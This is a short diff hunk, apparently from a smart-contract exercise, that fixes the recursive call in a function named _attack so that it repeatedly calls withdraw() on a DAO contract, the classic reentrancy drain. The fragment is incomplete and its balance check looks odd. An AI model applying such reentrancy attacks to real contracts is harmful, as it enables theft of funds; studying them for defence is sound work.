@@ -20,7 +20,7 @@ def _attack() -> bool:
     
     if (DAO(self.dao_address).userBalances(self.dao_address) >= 10000):
          DAO(self.dao_address).withdraw()
-         _attack()
+         self._attack()
    
 
     return True
